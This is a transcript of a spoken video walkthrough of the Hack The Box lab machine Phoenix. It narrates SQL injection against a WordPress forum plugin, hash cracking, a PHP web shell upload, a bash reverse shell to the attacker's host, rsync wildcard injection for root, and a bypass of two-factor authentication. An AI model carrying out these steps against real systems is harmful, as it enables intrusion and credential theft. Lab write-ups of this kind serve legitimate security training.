 what's going on youtube this is ipsec i'm doing phoenix from hack the box which starts out um poking at a pretty complex wordpress installation that includes a forum and has a fail to ban thing uh blocking you if you hit too many 404s on the page so you can't really just wp scan your way to identify everything that being said there is a blind sql injection that is time-based and the form plug-in that is installed they can use to enumerate the database and find other plugins that are active and you can use that information to find a vulnerable plugin and get a shell on the box and then once you get the shell the privesque is relatively straightforward it's just a wildcard injection into rsync that you have to find but the whole finding a vulnerable plug-in how i explained it is kind of unintended the intended way is to dump information to build a multi-factor pin to bypass the 2fa that's on the wordpress instance so with that being said let's just jump in as always start with an nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory and call it phoenix and then the ip address which is 1010 11.149 this can take some time to run so i've already ran it looking at the results we have quite a few ports open it looks like three to be exact so ssh on port 22 and spanner tells us it's an ubuntu server then we have http on port 80 it's apache and redirecting all requests to phoenix.htb so right off the bat i'm just going to add this into my host file so sudo vi se host and we can add 10 10 11 149 call it phoenix.htb and then move on with our nmap so the next thing we have is https on 443 it's also apache the ssl shirt has phoenix.htb we have some validity dates it looks like it's good for 10 years um the robots.txt has a disallowed entry for wp-admin so i'm guessing this phoenix.htb is a wordpress site and that's all we know about this so for far so let's go take a look at it so i'm gonna go to https phoenix.htb let's accept this security risk because it's a self-signed certificate and actually we should always look at these certificates um mainly to look for like alternative names and things like that because other things may be hidden in this for instance we have an email address right here which could be used for a login so it's always nice to see this information i don't see any other domains other than phoenix.htb so we can just close this out this page looks like it has lorem ipsum so i'm not going to bother reading this i'm just highlighting over these links it doesn't look like anything's here i'm guessing this github it's funny this is a facebook link but it's pointed to a facebook icon but it's pointed to github maybe that's the creator of the box i'm not exactly sure we have a details in the top left clicking on it we have a coming soon and some more links it looks like facebook again is going to github um i'm going to check out this blog and we know this is probably going to be wordpress we could click sign up or something and see and when i click sign up something odd happened i think it disclosed it was a plugin so look at the title of my browser oh no it said phoenix something i thought it was like the name of a plugin when it was loading but um nothing there it just the title bar changed so if we go to login this is not a standard wordpress login so there's probably a plugin handling this and then there is forums so we have two things um we have forms and this blog so i'm gonna press ctrl u to verify this is wordpress if we go down here we see phoenix.htb here this pi thing this is definitely going to be a wordpress plugin i do recognize it we can run wp scan and then i'm going to check out the forms because i don't know what this is wordpress doesn't have forms natively i'm going to guess the name is going to be osgaros because we have oscar's form right there in that comment but always have some type of recon going in the background so let's do a wp scan so i'm going to copy this let's do wp scan dash dash url i want to say is that how we do it um come on wp clear type reset there we go wp scan dash dash url i think dash k for ignore ssl certs dash e enumerate plugins um let me actually look at the wp scan i always have to look at help of these type of tools before i run them so we definitely want plugins detection mode and we want this to be aggressive so let's see this aggressive and what this is going to do um typically when wordpress scans things it's not going to hit slash wp content slash plugins and then the plug-in name for every plug-in it's going to look at like the source code of things and try to identify the plug-in that way i believe by saying it to aggressive mode it's going to go into the wp content directory and try to hit every single um plug-in directory so that's why i always like doing that because it's a bit more um like better at detecting things and i think the default is to only detect vulnerable plugins i always like changing it to all plugins because um it's wordpress there's probably gonna be a lot of vulnerable plugins right so well just because um it's not marked vulnerable doesn't mean you can't download the plugin and find a vulnerability so that's why i do all plugins and i think that's all i really want to do um i can change detection mode to be aggressive as well if i did not do that already so aggressive dash e ap and let's see what is output is it dash o wp scan out and before i run this this is going to take a long time to run um whenever you do like the aggressive plug-ins thing it just takes a while so i just want to run a whoops quick wp scan and then do a dash e u for numerate users um k is not a valid option let's see ssl dash disable tls checks so in a lot of um command line plugins dash k is ignore ssl i don't know why but that's my default um not gonna bother updating let's just see if it enumerates user names and then we can change the dash k up here and it's only going to brute force 10 ids and it looks like i did not revert this box because there is a ipsec user that had created one i was running through this box before i recorded the video but we have phoenix john jane and jack so it's v users.txt and phoenix john jane jack right yep so that is all the users so let's run this wp scan make sure this starts running before we do anything um i'm guessing it's not giving me output because i did dash out that is going to be correct so before i do this um i just want to run a time so you guys can see how long this actually takes it's probably gonna be like an hour or so but um if we wanted to we could just look at all the default output if i didn't cancel it out but not too much information on the default wp scan so the next step is while that runs we can go look at the forms so if i look at i don't know why i just did that actually i'm going to copy this whole thing just google asagarro form exploit and see what there is we have an unauthenticated sql injection right off the bat which seems to be good and this proof of concept so i'm going to copy this and this looks like it is a time-based exploit which kind of sucks because those are pretty slow but we can test this out um let's not even do um that yet let's do a time curl https phoenix.htb form i'm going to change this sleep to be two seconds and we have to put this in quotes because that has some special characters uh ssl certificate problem so add a dash k and forbidden this ips been blocked for excessive brute forcing block would be lifted in 60 seconds so that's probably my wp scan um wp scan looks like it is preventing me from doing this so i'm just going to wait 60 seconds and then we will run this curl command okay it's been 60 seconds so my band should have lifted we can do this code k and there we have it so it took two seconds there if i take this out and swap it with a five now this command should take five seconds which confirms we have a sql injection so now what we want to do is pass this over to sql map so what i'm going to do um i'm trying to think the best way to do this i think i'm just going to try it like this if we put a star here then sql map will um inject right there so sql map dash u um i think dash dash technique equals t for time based is that how i do it custom injection marker yes i want to proceed um let's see you have declared do you want to use those sure i'll use those [Music] cookies and let's see if this works um the main thing i'm concerned about right now is the brute force detection so i'm not positive if this is going to trigger when i do this sql dump which would be bad right um it's testing everything and all parameters appear not to be injectable so i'm going to try level 5 to set this and we can also do dash dash risk 3d this is going to be like testing everything in sql map by default sql map doesn't test what it declares to be risky or dangerous queries so it doesn't always find things if this one doesn't find it then we're probably going to pass this into burp and do sql map the normal way it's also possible that sqlmap didn't find it because i got blocked we could always test this again by curl k phoenix.htb form and do htps and doesn't look like i'm blocked so that's good right now um maybe the blocking only affects the like wordpress site to block like wp scan but maybe the form itself isn't affected and i probably could have set like the database to be my sequel because most databases are my sequel but um i'm just gonna let this sql map finish and we'll continue because i'm not sure how long this is going to take it is finally found the exploit if you're running it you should probably do dbms equals my sequel because we see we started it at 235 and it took like 32 minutes i think that's a long time if we just specified my sequel it'll probably take like three to four minutes so um do you want to skip specific failures for other db yes and now it's gonna check if it's a false positive which i don't think it will be i'm not exactly sure what time base blind parameter replaces but um we could have put it through perhaps we didn't found that out or like um enabled verbosity or eversity i forget how to pronounce that word and sql map sure it shows us the queries but i don't really care all that much because we know how to trigger this manually um but time based blinds are just such a pain to do manually sql map is really the way to go here and i want to say it should be done by now maybe it's just taking like putting long sleeps in um let's make sure i'm not banned so let's do this curl again nope i am not banned it's just taking its time so let's copy this command and set up the second one we want to run so i'm going to put the sql map here and i'll do dash dash dbms is equal to my sql and then i think it's dash dbs um let's see sql map dash h dbs um let's see dash capital d for database i want to say dbs will dump a list of databases it's probably like a sub command so i don't see it here current user current db passwords tables schema dump all uh hh for all options uh dbs so this is probably what we will want we can also do roles to see if we have like the file role or privilege probably both of these would be good if we have the file role then we could include things like etsy passwd and leak files on the box could leak like the wp config file and get a password there's a lot of cool things we can do from that um but still oh i hear and i guess it just wasn't printing too standard out so there we have it um let's now run this sql map i'm going to ctrl c this so you can see i'm also going to add dash dash batch so it doesn't ask us any questions and we'll see how long it takes to dump these databases we could probably try threads and increasing the threads to speed it up but i can't remember if sql map doesn't like us doing threads and time-based blind queries because you're inducing a lot of load on the server and when you run multiple queries that increases the false positive likelihood um for here i guess we can see what the parameter replaces it's doing case 1 2 21 64 equals 2164 then sleep else so for this it's gonna be case one and then each um character is this so it was like case when count databases is equal to one then sleep and if it doesn't sleep then there's not one database it's gonna do case one the count of databases equals two then sleep and it sees oh it was two it slept for five seconds and that's when it starts dumping so we can see this here it is dumping this it's going to be information schema but um we just have to let this finish and then we'll see what the second database is i'm going to guess it's going to be called wordpress so um i'm going to pause the video and we'll just um see what happens and it looks like we're correct with the second database being wordpress so um here we probably want to dump the tables of wordpress or we could do the dash dash roles to see where the roles are i'm going to add threads let's see what it says um i think it's just dash t let's add 20 threads and see what happens uh i should have done batch as well but if it works with threads then it'll go much faster because it will brute force multiple characters in the string at the same time so um we'll see this very important okay it's just telling us not to do stress the network sure we can do optimizations and we'll see it doesn't look like it because i don't see it getting the number of characters so if this was not a time-based blind you would see um sql map like do a len for the output and put a count of characters so that can brute force multiple things um doesn't look like it is working here um adjusting time delay to two seconds and i think it's just going to do one character at a time so uh that doesn't work we can double check our syntax that it is indeed thread um i wonder if i do dash t temp list tamper table temp that's a capital t where is lowercase t i saw dash dash threads maybe i need to do dash dash threads uh this is saying wordpress let's just do dash dash threads is equal to 20 and we'll add a dash dash batch and maximum number of threads is 10 so let's set it to 10 and it did resume right where we left off so that is definitely nice um and there's the first one is word i'm guessing it's going to be press for the next one because did i leave dbs oh i did leave databases so let's get rid of dbs so we only do roles and see what roles we have of this if any so now that that's done it doesn't really reveal anything too interesting um however you can see how slow this is now going so we don't really want to just do like a dash dash dump to dump the whole database because every query is taking like minutes to get the information out because it has to a time based one character at a time so for this we want to be very targeted at what we are dumping so i'm going to go to google and let's search for something like wow google is taking a while do i not have internet right now how am i accessing the labs um google.com ping eight eight eight uh i guess my ipv6 tongue was down that is weird uh i wonder if i just do a search like this if it'll work um if not then maybe you have to go to bing uh let's see wordpress not wordpress yeah wordpress database structure if we google this sweet that works um beginner's guide to wordpress database and schema and structure so this tells us the table so we have wordpress post post meta options users whatever so if i look at the users we have user login user pass this is probably going to be the things we want right we want the login name and the password so if we go back to our sql query we can say dash d for database wordpress and let's get rid of this dash dump because that will take forever dash t we can say wp underscore users and then we can say a dash dash where and actually uh we don't want where yet we can just say um dash c for column and we can say user underscore login and user underscore pass so this should dump the login and pass from it let's see uh we screwed something up see sql map resume from stored session that did not work see if i do dash t wp underscore users is that going to dump everything let's go back to let's see sqlmap hh table table prefix let's see dash t so the table to enumerate c is columns what if i need a dash dash dump still let's try adding we can get rid of threads i'm gonna get rid of batch real quick see what this says yeah we can assign okay let's try a dash dash dump and dash c i definitely want to do that okay so we need the dash dash dump to dump things um that's fine and we should be dumping just user login user password now while this works um if we went to the wp options we have option name and option value and we can also dump a list of plugins here so every single um like wordpress plugin or wordpress setting goes into this wp options table so there's tons of settings here but this is a very good table to look at so um after this dumps we will um dump a list of plugins out of that table and skip a step on this box so there is going to be multi-factor authentication installed it's the same one that's installed on i want to say it was pressed that i released for the uhc we just bypassed the multi-factor in different ways but i'm going to bypass the multi-factor at the end of the video because i initially did the box was just find out what the plugin was and then exploit it that way so you're supposed to use your cadential login to wordpress then find the plugin i think so just different ways to find it um we're going to bypass multifactor by just not logging into wordpress altogether but i gotta let this run it's gonna take a while so i'm just going to again pause the video and we'll resume it when it's done okay so now we have all the hashes it took a long time to run but we can do probably like credentials.text maybe maybe that's a bad one um i'm gonna call it to crack right because i want to put these over into hash cat so let's get this in a good format so i don't want to do that every time let's see percent s pipe g like that there we go and let's see we can say space like that uh percent s space pipe like that and then every space will replace with a colon oh god that did not that did not work um let's see space star no dot space c percent s space colon g like that yeah let's just do it the hard way right um let's see if i do s okay it's multiple spaces i was hoping it would be like a tab but i'm just hitting dw and we don't need ipsec so dwi colon to do this so now we have username colon hash so i can cut this and we can sh into the kraken and try to crack these so v our cd hashcat v hashes phoenix.txt put that there i think users and it's going to take the username colon just use that for the pot file so we can see what actually cracked in the end um then we want to give it the file so hashes phoenix and then the word list we're just going to use rockyou.txt and hashcart.bin there we go maybe it's dash dash user and let's see if it auto detects this hash i want to say it should be mode 400 for a php pass and i'm just doing that based upon the dollar p dollar and we see yes it does detect it so we have a few we have phoenix the firebird 14 super phoenix and password1234 so far um it's not telling us the username so once this finishes i can do the dash dash show to see what those are i'm just looking at the time that is left um restore point where are we okay 100 so i'm going to get rid of the word list if i do show we can see john is password1234 phoenix is phoenix the firebird and jay smith is that so let's go back we don't need to be on the crack anymore we can look at users.txt let's see paste this so we can get rid of john because we cracked it phoenix we cracked it um it's either john oh wait did i have john twice maybe i mistook john for jane so j smith this could either be jane smith or jack smith so we don't know which one that is but we do have john and phoenix so we can try logging in via wordpress so let's go back to phoenix.htb click on login and then the username let's do ja let's do phoenix so p h o e n i x and then p h phoenix the firebird 14. oh come on let's just cat uses.text copy paste that 15 and when we log in we have multi-factor authentication so in my press box i had php anywhere installed and we used xmlrpc to bypass this in this box we're going to go and extract data to generate our own multi-factor at the end of the video that's the intended way but we could just find out a list of plugins installed through wordpress so let's go back to our sql map command we have the table wp users remember i mentioned wp options and then we want to get the option value and there's gonna be like probably two or three hundred entries in this wp options table so we definitely want to um filter it out so we can say where option name is equal to active plugins and i think dump and everything is there so we can let this one run oh we should add batch i don't know why i removed that by accident but let's see if it starts dumping things um the wear option in sql map is super nice so it is thinking and come on start dumping so we can pause the video and resume so um it looks like there's i don't think there's just one entry i think it's still just seeing how long of a sleep to implement so um i'm just going to pause the video we'll resume when this sql map thing is done okay well that seems to have taken forever but we do have it finally dump a list of all the activated plugins it's a php serialized object we can see it has the slider gallery then we have add minimize and then the form the esgaris form and then download from file uh mini org two-factor authentication a photo gallery pi register simple local avatars and timeline event history so this does help a lot um i'm gonna look for vulnerabilities and download from files just because i know offhand that one is vulnerable but in real life i probably would have been going through each of these at least when i did this box originally so i'm gonna do download from files exploit look at the results and we have a unauthenticated rce from wp scan is there a poc script i don't see one um well we have it like a curl command but i'm hoping we can find just a python script if not we'll create one exploit db we probably should have went there first so looking at this this looks good i'm gonna switch it over to raw then download it so i'm going to wget and then we can move 50 to 87 to download from file exploit dot pi and take a look at this it looks like we have a banner that says how to use it thankfully it is python 3. um every now and then when you pull scripts you get python 2 but um thankfully that's like years ago so it's not as common anymore so we can do https phoenix.htb and then it looks like we have to give it a shell so let's create a [Music] shell.php and we'll just do system request cmd just a basic php shell i can also do echo please subscribe and i'm doing the echo before this because maybe like the system command is disabled so um always want to see something work right so if i don't get the system working but it says please subscribe i know it worked so let's see we can just do shell.php and we have a ssl cert problem so if we look at requests we can then set a verify is equal to false so we're not validating ssl certs uh we have one in this thing is there any other nope so we only have to modify it twice and shell upload failed um i want to hide these errors real quick so i'm going to go to google python hide this let's see import url lib3 and then we do this awesome so shell upload failed um let's just rename it to something else so i'll call it ipsec.php i'll try uploading it just in case like it doesn't like the file name and we have it failed as well um if we look through it though it says it supports php4 and phtml so let's try a php4 so let's move ipsec.php to php4 and then run this exploit again and it says shell has been uploaded so if we go here it's not executing anything we can see php echo it's printing out the whole script so let's try the phtml we have to correct that and then run this again uploading so that one worked we do p html we have it say please subscribe so if i do question mark cmd equals id it is perfectly fine so we have a reverse shell so i'm well not we don't have a reverse shell but we can potentially get one so let's go now into burp suite make sure i am proxing intercept is on just going to for this request send it over in repeater change it over to a post because we can have a lot more bad characters in this and then do the standard bash reverse shell so fourteen eight nine thousand one zero and one like this and then ctrl u to url encode it listen on 9001 send it and we get a shell so if i do python 3 dash c import pty pty dot spawn then bash that looks good control z st2y raw minus echo fg enter enter and then let's export term is equal to x term so i can clear the screen and then i'm also going to set my tty so i'm going to do stty dash a rows 26 columns 105. so stty rose26 calls was it 105 yes it was there we go and all that does is let me have correct line wrapping when i go down if i didn't do that this whole command would be really wonky so now that we are this user um i'm going to check the wordpress config to see if we get another password so if i cat wp-config.php uh grep i let's do pass we do have a password and this was actually looks like it was generated through the like the xk pass wd um xkcd comic but um this is the format they use so fight cat etsy pass wd we can see quite a few users i'm going to grab sh and the dollar to find lines that end in that and then we have root phoenix and editor so i'm going to try su editor and we have verification code let's do su-phenix and i don't know what the verification code is it looks like multi-factor authentication is installed on this box so one other thing we could have done that um we didn't do is try it through um ssh so they do ssh editor at 10 10 11 149 yes put the password in i'll receive too many disconnects my clipboard was actually wrong it pasted my reverse shell as the password so let's grab this again actually [Music] wp config we want to grab this shift insert there we go that is correct put that there and the credential doesn't work um if we look at our users.txt phoenix was a user and we have a password for phoenix so if i do ssh phoenix at this put the password in and we get a disconnect so let's try um we can try editor e-d-i-t-o-r so it looks like fail-to-ban or something is installed because now we're getting connection refused so i'm going to confirm that so if i do cd slash etsy find out grab fail and yes fail to ban is indeed installed which makes it hard to brute force these passwords um the other thing we could potentially do is look for services so if i do um i think it's like system let's see i'm just gonna find dot grab system d and find all the services that are installed we could look through these but i'm more curious about the multi-factor authentication because generally uh you store a um secret in a user's home directory so if we go um to slash home we can do find dot dash type f to see if there's any files here we can't go into phoenix or editor but i want to go into the pam configuration and see if i can figure out where it is so i'm going to cat sshd and i'm going to do a grep v for anything that begins with a comment and then a grep period to hide all the blank lines and we have a access file here so this looks like it is going to be a configuration and then it's configured to use the google authenticator and it's storing the secrets not in the home directory but ver lib to factor so let's do a lsla on this directory and we can see we do have multi-factor things for editor phoenix and root but only root can read these files so we can't just grab their seed let's take a look at the access conf this file and we see something weird um a plus here 10 11 12 13 24 and a minus here in all all so what this is doing is excluding multi-factor authentication from i want to say this subnet but it's weird because um generally this would be 10 11 12 0 24 i think the like um cider notation is wrong there but if i do an ip addr we can see i do indeed have two nicks 10 11 12 13 right there so if i do ssh phoenix at 10 11 12 13 and let's go back to [Music] our creds so users.txt and i'm going to try phoenix the firebird 14 i just pasted there to make sure everything was good with my clipboard invalid password i'm going to try that with editor and really hope that fail to ban is not applied to this interface so ssh editor with that password doesn't work um we can try super phoenix so copy this paste this and we get in as editor um if we tried that on our host i'm guessing fail to ban is now dead so if i do this still can't ssh um i wish i could show you right now but it looks like i can't maybe ssh localhost yes put the password for editor and we get verification code um localhost is 127001 which required multi-factor authentication because everything that is not this 10-11-12 subnet requires multi-factor um the correct way to uh put this ip would have been slash 32 because this just means one ip address doing slash 24 means this octet could be 0 to 255 so um at least i think that's right i always get well maybe one through 254 because technically zero to be the network 255 would be the broadcast but um if you want to know more about that look in the intro to networking academy module it should be free i helped rate a lot of that so um let's just keep going on with this if i do ls-la uh we can't see it um i keep thinking my google authenticator secret would be here but it's in ver lib secret and our var lib2 factor and oddly enough my user can't see it so um i can't get a second shell so from this point uh we may want to run lin peas or we can just poke around at things the one thing i always like doing is looking for like when this box was created i spawned it june 23rd chances are this user was created in november 21 20 the 21st of november of 2021 so what i want to do is look for all files created around this time so let's run find slash and we can say newer mt so newer modified time then um forget the format of this i want to say it's month day year so we can say instead of the 21st i'm going to do the 18th and then exclamation point for not newer empty 11 let's do 24 2021 and we can say ls um so that's not it let's see find newer md i am intercepting this request let's see how does it want the date 206 so year month day so i'd like got every field wrong uh us silly americans with how we normally notate time uh 18 21 no 11 18. there we go 20 21 11 24. does this work awesome um www data has a lot so this this looks like it's going to be a bit painful so to dev null um we can grep dash v [Music] dub dub dub data that isn't too interesting to us and see what we have so the pam files stick out our home editor that's no surprise bunch of stuff and user lib verlib uh we have backups that's not too interesting but i don't find anything too interesting with this find command so we do lsla on slash we do see a backups directory and we could have found that as well probably if we just did a find and then like dash user editor this is always a good thing to run i was due to death null again to hide errors we can do grep dash v slash run then escape slash cis let's see i don't know why that did not work let's do slash cis slash proc and this would show us the backups so if i look in slash backups we do have something being ran consistently so there is a cron running so we can see that if i do a ps ef i'm not seeing anything um and the reason why i'm not really seeing a lot of extra processes is let's see can i view f-stab i can we see slash proc is mounted with hide pid equals two which makes it so users on a linux system can't see another user's process so peace buy or something like that would not help us here if i look in if i echo my path there is user local s pen and use a local bin these are always good directories to look because things in a local directory aren't managed by a package manager and may be out of date so you should always look in these i think if we ran linps it would probably show us this but doing ls's in these directories we do see cron.sh.x so let's go into this directory and if we less this we see it's an elf binary if we do a strings and look for things to see if there's anything interesting um it's not and this is just like a compiled bash script which um the newest version of this thing doesn't have a good decompiler that being said it's somewhat trivial to reverse it so if we do a s trace on this cron script we can see what it does so it's running stat probably to check if all these files exist and it's hanging looks like it hung on gzip right here do you wish to overwrite this sure and then again it's doing a rsync and we can't really see all their arguments for this so one thing i would generally do when i see this is do we have t-mux oh sweet i can do an s t-muck session i hit ctrl b twice and then a line break so the t-mux command goes to this one um if i just do one control b control b being the magic character if you watch my tmux video i had rebound that to control a i've since changed it but if you do one it does on your parent t-mux you do two it doesn't on the child um so i'm going to run the script again and it's going to hang right whoops shoot oh god um where'd it go is it this three one t-box a shoot um let's see this be i'm so confused this is why you don't do nested t-muxes there we go um that's fine so ps ef we can see this process i'm going to go to five nine one two five so cd slash proc five nine one two five and then cat the cmd line and we don't have anything let's go to the actual process five nine one four five five nine one four five cat cmd line and we have the actual script so this is going to be the kron script that is running and we can see it does rsync with wild cards so this is going to be a simple wildcard injection um i'm going to get out of this nested t-mux as fast as possible because you can see how much of a pain that can be but i'm just going to call this cron.sh we put the script here and it's going to put the current date in the now create the file it's going to run a mysql dump to backup the wordpress database then our tar command on that gzip then this find to are this going to delete files older than 30 minutes and then it's going to our sync it to [Music] a different server so because of this wildcard we can inject here because how the wired code processes um think of it not passing the wild card to the rsync command but the bash command processes the wild card and pulls all the files it matches and then puts that in the argument that then passes it to rsync so if this wild card was a different flag then rsync would treat that flag maybe we can do it with ls real quick makeder.tamp so we do touch ipsec touch please subscribe so if i do an ls star um oh i created three files but that's fine so we created those if i do a touch and then dash dash what this is going to do is say don't treat these next things as an argument so if i do dash la and now if i do a ls star um you see i don't see the la file i just see everything here right if i do ls dash la let's do temp like this we can see this is a file um but because i do the wild card the wildcard is going to take each of these files that match the wildcard and then pass it as an argument to ls and ls is going to say oh dash la that's an argument not a file so that's the heart of wildcard injection so let's go figure out how we can abuse our sync i'm going to go to gtfo bins and from here we can just do rsync and see what the flags are so there's an rsync dash e that executes a command it looks like so all we need to do is pass dash e and then a command so what i'm going to do is go to my box i'm just going to attempt and i'm going to call this ipsec.sh i'm going to say bin bash and then bash c bash dash i dev tcp 10 10 14 8 9 000 1 0 and 1 like that and i'm going to make sure this reverse shell works let's make it executable so dot slash ipsec so the reverse shell does work so now what we want to do is figure out where to create this um rsync command so i probably should go back here and let's see cat cron is it going to go somewhere we're going into slash backups so cd slash backups and this is where we want to create it and the i guess maybe tricky thing we have to make it have a period in it which i guess that isn't actually tricky um i'm gonna do touch dash dash i'm gonna do dash e go back here let's see they do sh c like that space double quote temp ipsec.sh and i think that's right um let's see can't touch um let's see it doesn't like the slashes slashes are very bad for directory names um let's do move temp ipsec.sh here i wonder if i can do dot slash ipsec like this uh no such file or directory i don't know if i can just do bash ipsec.sh that's probably not going to work now that i think about it um the reason why i don't think it's going to work is i don't think this bash is going to be in the back oh nope it is i did not think it was going to be in the backups directory um so alternatively what i would have done is probably use curl or something and did a execution that way but here we are we are root on this box and we can cat root.text and get the flag so i did say we were going to show the intended way with the multi-factor brute force so um i guess let's step back a little bit the one thing i will be doing though is some of this data you had to get through sql dom because how slow that is i'm just going to do it manually with the shells i have because um that's a much more enjoyable process so the very first step is finding the source code to this plugin and it is open source um let's see do we have a login still we can just log in oh right here so it's powered by mini orange two-factor authentication if we click there let's see we could probably click try now for free is that gonna work uh it wants me to sign up i'm just gonna google mini orange mfa wordpress and see if this brings me to a download is this going to be the same site or as download i don't see it i know there is one here's a plugins.mini orange this may be it pricing integrate download plugin there we go and then we can download it should be saved and then we just need to move it somewhere so i'm going to call this analysis and move downloads mini orange here unzip it there we go and i'm going to open up in codium and this is going to be the hard part of it because this is a huge plugin you could like look through functions and potentially get something we have google authenticator config status but how i had found this is i went to uninstall.php because this was the file that stuck out to me and this is going to show us all the functionality this adds into wordpress so this delete option this is just a wordpress thing there's like get option get user meta all these are wordpress functions but going through this we can potentially see things um well obviously we see things but just reading through this um we can see all the entries it adds into wordpress to see if anything sticks out to us this is all options so i kind of skipped over this because i know for every user they're going to have a different multi-factor thing and these are not related to the user right and we see if option is on-prem then it's going to get a list of all the users and then for each user it's going to delete things in the user meta table of wordpress and the one thing that really stuck out to me is this mini orange two-factor google authenticator key like this sounds like it's going to be the secret for the user so i'm going to do edit find in files search for this g auth key and we can see it's used in uninstall and this google authenticator on premise thing so we can see to set it it's going to call this encrypt function to get it it's going to call decrypt data so decrypt data has secret and key and we can see key is going to get user id mo2f get off random string and then the secret is going to be this we can also search around for where this decrypt data is so i'm going to find in files look for decrypt data and it's in encryption.php which is in handler 2fa so i'm going to copy this out of it so i'm going to move or not move let's just cp so mini orange handler 2fa encryption.php because i want to create a script that i can then import this and call decrypt data and generate my own mfa key that's my end goal here so i'm looking at what this decrypt data does and let's go to common login and we can see kind of how it uses so get option mo2f key and then get user meta so i'm going to go back to my reverse shell we're going to um go in we can probably exit out of editor because i want to go ver dub dub dub html that's not where wordpress is uh find slash dash name wp config dot php to devnl serv dub dub dub wordpress cat wp config dot php grip for pass let's see i'm going to grep for db underscore so mysql dash u wordpress dash p and we can copy this paste it in use wordpress to switch to this database and then we can say um [Music] let's see the first one we want is let's just do key because that's easy so if we do show tables we can get refreshed on exactly how wordpress works um we have let's see wp options what's that mo2f oh that's like blocked things so describe wp options and we can say select star from wp options where option name is equal to mo2f encryption key and there we have it the other thing i like doing with um in this instead of doing a semicolon doing a backslash capital g and it outputs in a more friendly format if this had spanned multiple things um it'll probably be helpful in um the next piece we do so i can exit this we can call this let's just go into analysis v mfa.php i'm going to say mo2f encryption key is equal to this okay and the next thing we need is the user meta so i'm going to select star from wp users because we got to get which user is um phoenix and again like you see how this is kind of ugly change this to backslash g and this is how it prints much easier so user id is one so if we do describe what is it wp user meta is this the column show tables meta use a matter no underscore we have user id here so we can say select star from wp user meta where user id is equal to one slash g and we get everything um what is the option we had wanted um maybe mo2f encryption key no i'll get user meta is that i don't know what this is actually doing um id is this a string i don't think that's a string no um so instead of the select star i'm going to say select meta key meta value let's get rid of metavalue because i think that's making my output bad here we go so user ip mo2f google auth probably is what i want so let's see select star where user id equals one and what was this thing meta key is equal to what is that goog mo2f google auth is this it uh one of this is everything we need huh i don't think i saw this before so qr code secret and let's just try this um let's see google authenticator linux can we just do this let's see free otp let's see how to add generator let's see generator online let's do something really stupid and see if there is something here that's not going to do it let's see do i have something on my box i think it was like otp tool uh apt search otp tool github otp tool is this a thing one time password tools don't think this is it so i think i'm just going to do the crazy thing and i'm going to try doing a qr in code of this and seeing if i can just use google authenticator on my phone to get this working so if i do qr encode i don't have it so sudo apt install qr encode is this a file it is okay so qr encode dash h let's see output i want to i'm going to do standard out i'm going to see what happens dash o dash um let's see is it going to print well in ascii dash d dpi we can leave it at 72 i guess um i guess let's just try this so i should copy this and paste dash o space dash i thought i did that right file name if dash is specified the result will be output as standard output let's just do test.jpg i'm not doing qrn code so now i should have qrnco l lsgraptest so i have test.jpg and that is indeed a file so if i do open test.jpg um not a jpeg starts with 0x89 um what did output say was it png move test.jpg to test.png and we have a qrn code so let's try this out this is going to suck for the video because you can't see what i'm doing but i'm opening up google authenticator on my phone and we'll see if i get a multi-factor key and i'm sure other people are going to find other ways oxdf does a better job at going in depth but in an actual engagement this is how i would do it so um i have a key now on my phone so let's see if it lets me log in my session may have timed out wherever i am here so six two three two four one um let's six two three two four one no response did i get blocked out let's just try logging it again so phoenix and my password cat creds um let's see cat 2 crack nope cat users here it is phoenix the firebird 29 and 910360. and it does not look like this is working um which is surprising i honestly thought that would work after we had it um so i guess we're back to the drawing board of getting this encryption key so let's go back over to our source code and looking at the encrypt data um it's going to get encrypted codes from this table i don't know exactly what table that is or a column and then key oh actually we're probably in the wrong thing this is backup codes generate so we probably don't want that let's try the next result the next one is actually encryption but the one below that is ga on-prem which i'm assuming is google auth on-prem and we want mo2fg auth key and this one so let's go back here and i'm going to see if these are the actual keys it's using so mo2fg authkey definitely not this is much longer so let's do mo2f g off key is equal to this and then the other one we want is get off ran string so mo to f what is it i can just paste it is equal to something and we're doing this all for user id 1 which is phoenix so k h x x so there we go this value we don't need at all um we can include encryption.php i don't care if i put a semicolon or not on an include and let's see where is encryption.php i can just call decrypt data now so echo decrypt data and then how does this call it secret so it's going to be this so paste that and then the other one is the key which is this okay so i wonder if this is going to work php mfa thrown uh call to undefined function decrypt data so v encryption if i just don't make this a class let's see or i'm going to less it so i can copy it easier and copy this v [Music] mfa paste double colon is that going to work better there we go so this is probably going to be a secret that we can put into is it oauth tool i want to say maybe otp tool let's see app search oauth tool see otp tool ipsec dot rocks there's probably something i've done here mfa um let's see otp trtp let's see we can probably use s token app search as token sudo apt install s token and hope this works because we could very much get banned right um let's see s token paste this um i forgot how to use this import token is equal file i don't know if this is the right tool so i looked at notes this is the wrong tool let's install oauth tool this is definitely it so if i google oauth tool we want this program and i think this is installed through pip so pip3 install oauth tool let's see if this just installs um looks like it is there we go um hex decode failed so we can do i think totp i defaulted sha1 let's see how do we specify the seed i think i just need dash dash t-o-t-p and we have to do dash b to say it's in base 32 format and there we go we got a key um the one thing i am going to do is make sure my time is in sync 58.50 this looks close enough so let's really hope this works so we have one attempt left zero three nine six six six validate it's thinking it's probably gonna log me out and force me to log in again because i've been on the screen for so long um oh no dashboard so there we go now i'm logged in um i can look at plugins this way and then see the download from files is installed so this is the intended way to do all of that so hope you guys enjoyed the video take care and i'll see you all next time